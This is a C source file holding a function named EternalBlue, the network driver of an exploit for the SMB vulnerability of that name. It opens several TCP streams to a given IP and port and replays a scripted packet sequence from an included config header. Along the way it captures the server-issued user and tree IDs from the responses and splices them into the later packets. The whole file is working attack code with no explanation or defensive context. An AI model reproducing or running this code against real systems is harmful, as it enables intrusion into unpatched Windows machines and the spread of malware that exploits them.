#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS];
    WSADATA wsa_data;
    unsigned char userid[2] = {0, 0};
    unsigned char treeid[2] = {0, 0};
    size_t i;
    int wsa_started = 0;
    int result = -1;
    static const char userid_marker[] = "__USERID__PLACEHOLDER__";
    static const char treeid_marker[] = "__TREEID__PLACEHOLDER__";

    if (ip == NULL || port < 1 || port > 65535)
        return -1;

    for (i = 0; i < NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("EternalBlue: WSAStartup failed\n");
        return -1;
    }
    wsa_started = 1;

    for (i = 0; i < EB_OPS_COUNT; ++i) {
        eb_op_t op = EB_OPS[i];
        size_t stream_index;

        if (op.stream < 1 || op.stream > NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %lu\n", (unsigned long)i);
            goto cleanup;
        }
        stream_index = (size_t)op.stream - 1;

        if (op.kind == 0) {
            struct sockaddr_in address4;
            struct sockaddr_in6 address6;
            SOCKET sock;

            if (sockets[stream_index] != INVALID_SOCKET) {
                printf("EternalBlue: stream already connected at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }

            memset(&address4, 0, sizeof(address4));
            address4.sin_family = AF_INET;
            address4.sin_port = htons((u_short)port);
            if (InetPtonA(AF_INET, ip, &address4.sin_addr) == 1) {
                sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (sock == INVALID_SOCKET ||
                    connect(sock, (const struct sockaddr *)&address4, sizeof(address4)) == SOCKET_ERROR) {
                    if (sock != INVALID_SOCKET)
                        closesocket(sock);
                    printf("EternalBlue: IPv4 connect failed at operation %lu\n", (unsigned long)i);
                    goto cleanup;
                }
            } else {
                memset(&address6, 0, sizeof(address6));
                address6.sin6_family = AF_INET6;
                address6.sin6_port = htons((u_short)port);
                if (InetPtonA(AF_INET6, ip, &address6.sin6_addr) != 1) {
                    printf("EternalBlue: invalid IP address\n");
                    goto cleanup;
                }
                sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
                if (sock == INVALID_SOCKET ||
                    connect(sock, (const struct sockaddr *)&address6, sizeof(address6)) == SOCKET_ERROR) {
                    if (sock != INVALID_SOCKET)
                        closesocket(sock);
                    printf("EternalBlue: IPv6 connect failed at operation %lu\n", (unsigned long)i);
                    goto cleanup;
                }
            }

            sockets[stream_index] = sock;
            printf("EternalBlue: connected stream %u\n", (unsigned)op.stream);
        } else if (op.kind == 1) {
            size_t offset = (size_t)op.offset;
            size_t length = (size_t)op.length;
            size_t input_pos = 0;
            size_t output_len = 0;
            unsigned char *buffer;

            if (sockets[stream_index] == INVALID_SOCKET ||
                offset > sizeof(EB_PACKETS) ||
                length > sizeof(EB_PACKETS) - offset) {
                printf("EternalBlue: invalid send operation %lu\n", (unsigned long)i);
                goto cleanup;
            }

            buffer = (unsigned char *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL) {
                printf("EternalBlue: out of memory\n");
                goto cleanup;
            }

            while (input_pos < length) {
                if (length - input_pos >= sizeof(userid_marker) - 1 &&
                    memcmp(EB_PACKETS + offset + input_pos, userid_marker, sizeof(userid_marker) - 1) == 0) {
                    memcpy(buffer + output_len, userid, sizeof(userid));
                    input_pos += sizeof(userid_marker) - 1;
                    output_len += sizeof(userid);
                } else if (length - input_pos >= sizeof(treeid_marker) - 1 &&
                           memcmp(EB_PACKETS + offset + input_pos, treeid_marker, sizeof(treeid_marker) - 1) == 0) {
                    memcpy(buffer + output_len, treeid, sizeof(treeid));
                    input_pos += sizeof(treeid_marker) - 1;
                    output_len += sizeof(treeid);
                } else {
                    buffer[output_len++] = EB_PACKETS[offset + input_pos++];
                }
            }

            {
                size_t sent = 0;
                while (sent < output_len) {
                    size_t remaining = output_len - sent;
                    int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
                    int n = send(sockets[stream_index], (const char *)buffer + sent, chunk, 0);
                    if (n == SOCKET_ERROR || n == 0) {
                        free(buffer);
                        printf("EternalBlue: send failed at operation %lu\n", (unsigned long)i);
                        goto cleanup;
                    }
                    sent += (size_t)n;
                }
            }

            free(buffer);
            printf("EternalBlue: sent %lu bytes on stream %u\n",
                   (unsigned long)output_len, (unsigned)op.stream);
        } else if (op.kind == 2) {
            size_t wanted = (size_t)op.length;
            size_t received = 0;
            size_t minimum = op.fix == 1 ? 34u : (op.fix == 2 ? 30u : 0u);
            unsigned char *buffer;

            if (sockets[stream_index] == INVALID_SOCKET) {
                printf("EternalBlue: invalid receive stream at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }
            if (wanted < minimum) {
                printf("EternalBlue: response too short at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }
            if (wanted == 0)
                wanted = minimum != 0 ? minimum : 1;

            buffer = (unsigned char *)malloc(wanted);
            if (buffer == NULL) {
                printf("EternalBlue: out of memory\n");
                goto cleanup;
            }

            while (received < wanted) {
                size_t remaining = wanted - received;
                int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
                int n = recv(sockets[stream_index], (char *)buffer + received, chunk, 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(buffer);
                    printf("EternalBlue: receive failed at operation %lu\n", (unsigned long)i);
                    goto cleanup;
                }
                received += (size_t)n;
            }

            if (op.fix == 1) {
                userid[0] = buffer[32];
                userid[1] = buffer[33];
            } else if (op.fix == 2) {
                treeid[0] = buffer[28];
                treeid[1] = buffer[29];
            } else if (op.fix != 0) {
                free(buffer);
                printf("EternalBlue: invalid fix value at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }

            free(buffer);
            printf("EternalBlue: received %lu bytes on stream %u\n",
                   (unsigned long)received, (unsigned)op.stream);
        } else if (op.kind == 3) {
            if (sockets[stream_index] == INVALID_SOCKET) {
                printf("EternalBlue: invalid close stream at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }
            if (closesocket(sockets[stream_index]) == SOCKET_ERROR) {
                sockets[stream_index] = INVALID_SOCKET;
                printf("EternalBlue: close failed at operation %lu\n", (unsigned long)i);
                goto cleanup;
            }
            sockets[stream_index] = INVALID_SOCKET;
            printf("EternalBlue: closed stream %u\n", (unsigned)op.stream);
        } else {
            printf("EternalBlue: invalid operation kind at operation %lu\n", (unsigned long)i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 0; i < NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET)
            closesocket(sockets[i]);
    }
    if (wsa_started)
        WSACleanup();
    return result;
}